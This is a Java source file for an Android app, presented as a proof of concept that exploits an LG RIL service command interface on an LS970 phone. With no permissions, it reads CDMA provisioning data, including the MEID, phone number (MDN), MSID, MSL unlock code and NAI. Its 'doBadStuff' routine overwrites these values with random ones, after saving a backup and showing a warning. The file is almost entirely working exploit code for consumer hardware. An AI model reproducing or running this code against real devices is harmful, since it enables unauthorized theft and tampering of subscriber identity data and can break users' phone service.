package com.raab.lgsvccmdexploit;

import android.app.AlertDialog;
import android.content.DialogInterface;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.preference.Preference;
import android.preference.PreferenceActivity;
import android.preference.PreferenceFragment;
import android.util.Log;
import android.widget.Toast;

import com.android.lge.lgsvcitems.LgSvcCmd;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Random;

/**
 * Created by Matteson Raab on 11/3/13.
 * <p/>
 * Proof of Concept exlpoiting LG RIL to obtain and also change CDMA programming values.
 * This application requires no persmissions whatsoever to function on device.
 * This can and will change the phone number and other programming infomration on the device.
 * It will automatically create a backup of the existing programming beforehand. =)
 *
 * Tested on LS970 ZVC Build
 */
public class MainActivity extends PreferenceActivity {

    // Define constants found in /com/android/lge/lgsvcitems/LgSvcCmdIds
    int KEY_MEID = 9054;
    String meid = LgSvcCmd.getCmdValue(KEY_MEID);
    int KEY_MDN = 9002;
    int KEY_MSID = 9001;
    int KEY_MSL = 200;
    int KEY_NAI = 9155;
    String TAG = "LgSvcCmdExploit";

    Preference mdnPreference;
    Preference msidPreference;
    Preference mslPreference;
    Preference naiPreference;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        getFragmentManager().beginTransaction().replace(android.R.id.content, new LgSvcCmdFragment()).commit();
    }

    public class LgSvcCmdFragment extends PreferenceFragment {
        @Override
        public void onCreate(final Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);

            addPreferencesFromResource(R.xml.preferences);

            if (!isBackupAvailable())
                createBackup();

            Preference meidPreference = findPreference("meid");
            meidPreference.setSummary(meid);

            Log.i(TAG, "LgSvcCmd.getCmdValue() MEID: " + meid);

            mdnPreference = findPreference("mdn");
            msidPreference = findPreference("msid");
            mslPreference = findPreference("msl");
            naiPreference = findPreference("nai");

            setValues(false);

            Preference scramblePreference = findPreference("scramble");
            scramblePreference.setOnPreferenceClickListener(new Preference.OnPreferenceClickListener() {

                @Override
                public boolean onPreferenceClick(Preference pref) {
                    // Better safe then sorry!
                    if (isBackupAvailable())
                        doBadStuff();
                    else
                        createBackup();

                    return false;
                }

            });

            Preference restorePreference = findPreference("restore");
            restorePreference.setOnPreferenceClickListener(new Preference.OnPreferenceClickListener() {

                @Override
                public boolean onPreferenceClick(Preference pref) {
                    restoreBackup();

                    return false;
                }

            });

            AlertDialog.Builder builder = new AlertDialog.Builder(getActivity());
            builder.setTitle(getString(R.string.warning));
            builder.setMessage(getString(R.string.warning_message));
            builder.setPositiveButton(getString(R.string.got_it), null);
            builder.setNegativeButton(getString(R.string.exit), new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialogInterface, int i) {
                    getActivity().finish();
                }
            });
            builder.show();
        }

        public void setValues(boolean showDialog) {
            flushLogcat();

            mdnPreference.setSummary(LgSvcCmd.getCmdValue(KEY_MDN));
            Log.i(TAG, "LgSvcCmd.getCmdValue() MDN: " + mdnPreference.getSummary());

            msidPreference.setSummary(LgSvcCmd.getCmdValue(KEY_MSID));
            Log.i(TAG, "LgSvcCmd.getCmdValue() MSID: " + msidPreference.getSummary());

            mslPreference.setSummary(LgSvcCmd.getCmdValue(KEY_MSL));
            Log.i(TAG, "LgSvcCmd.getCmdValue() MSL: " + mslPreference.getSummary());

            naiPreference.setSummary(LgSvcCmd.getCmdValue(KEY_NAI));
            Log.i(TAG, "LgSvcCmd.getCmdValue() NAI: " + naiPreference.getSummary());

            if (showDialog)
                showResultsDialog();
        }

        public void showResultsDialog() {
            ArrayList<String> logcat = getLogcat();
            StringBuilder stringBuilder = new StringBuilder();
            int counter = 0;

            stringBuilder.append("Reset the phone for modifications to take effect. Logcat messages displayed below...\n\n");

            for (String line : logcat) {

                if (counter < 1) {
                    if (line.contains("Created Successfully")) {
                        stringBuilder.append(line + "\n\n");
                        counter++;
                    }
                }

                if (!line.contains("Created Successfully")) {
                    if (line.contains("QC_RIL_OEM_HOOK") || line.contains("getCmdValue")) {
                        //if (!line.contains("5155414c434f4d4d0410090004000000"))
                        stringBuilder.append(line + "\n\n");
                    }
                }
            }

            AlertDialog.Builder builder = new AlertDialog.Builder(getActivity());
            builder.setTitle(getString(R.string.results));
            builder.setMessage(stringBuilder);
            builder.setNeutralButton(android.R.string.ok, null);
            builder.show();
        }

        public void doBadStuff() {
            LgSvcCmd.setCmdValue(KEY_MDN, randomTenDigit());
            LgSvcCmd.setCmdValue(KEY_MSID, randomTenDigit());
            LgSvcCmd.setCmdValue(KEY_MSL, randomSixDigit());
            LgSvcCmd.setCmdValue(KEY_NAI, randomNai());
            setValues(true);
        }

        public String randomTenDigit() {
            return String.valueOf(10000 + new Random().nextInt(90000))
                    + String.valueOf(10000 + new Random().nextInt(90000));
        }

        public String randomSixDigit() {
            return String.valueOf(100000 + new Random().nextInt(900000));
        }

        public String randomNai() {
            String[] nais = getResources().getStringArray(R.array.nai_array);

            int position = new Random().nextInt(4);

            return nais[position];
        }

        public boolean isBackupAvailable() {
            boolean result = false;

            String[] values = {"mdn", "msid", "msl", "nai"};

            for (String value : values) {
                if (!getActivity().getSharedPreferences("PREFS", 0).contains(value)) {
                    Log.i(TAG, "Backup not found!");
                    return false;
                }
                result = getActivity().getSharedPreferences("PREFS", 0).contains(value);
            }

            return result;
        }

        public void createBackup() {
            SharedPreferences sharedPreferences = getActivity().getSharedPreferences("PREFS", 0);
            SharedPreferences.Editor editor = sharedPreferences.edit();

            editor.putString("mdn", LgSvcCmd.getCmdValue(KEY_MDN));
            editor.putString("msid", LgSvcCmd.getCmdValue(KEY_MSID));
            editor.putString("msl", LgSvcCmd.getCmdValue(KEY_MSL));
            editor.putString("nai", LgSvcCmd.getCmdValue(KEY_NAI));

            editor.commit();

            Toast.makeText(getActivity(), "Backup created successfully...", Toast.LENGTH_SHORT).show();
            Log.i(TAG, "Backup created!");
        }

        public void restoreBackup() {
            SharedPreferences sharedPreferences = getActivity().getSharedPreferences("PREFS", 0);

            LgSvcCmd.setCmdValue(KEY_MDN, sharedPreferences.getString("mdn", randomTenDigit()));
            LgSvcCmd.setCmdValue(KEY_MSID, sharedPreferences.getString("msid", randomTenDigit()));
            LgSvcCmd.setCmdValue(KEY_MSL, sharedPreferences.getString("msl", randomSixDigit()));
            LgSvcCmd.setCmdValue(KEY_NAI, sharedPreferences.getString("nai", randomNai()));

            setValues(true);
        }

        public ArrayList<String> getLogcat() {
            ArrayList<String> logcat = new ArrayList<String>();

            try {
                Process process = Runtime.getRuntime().exec("logcat -d");
                BufferedReader bufferedReader = new BufferedReader(
                        new InputStreamReader(process.getInputStream()));

                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    logcat.add(line);
                }

            } catch (Exception e) {
                e.printStackTrace();
            }

            return logcat;
        }

        public void flushLogcat() {
            try {
                Process process = Runtime.getRuntime().exec("logcat -c");
                process.waitFor();
                process.destroy();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}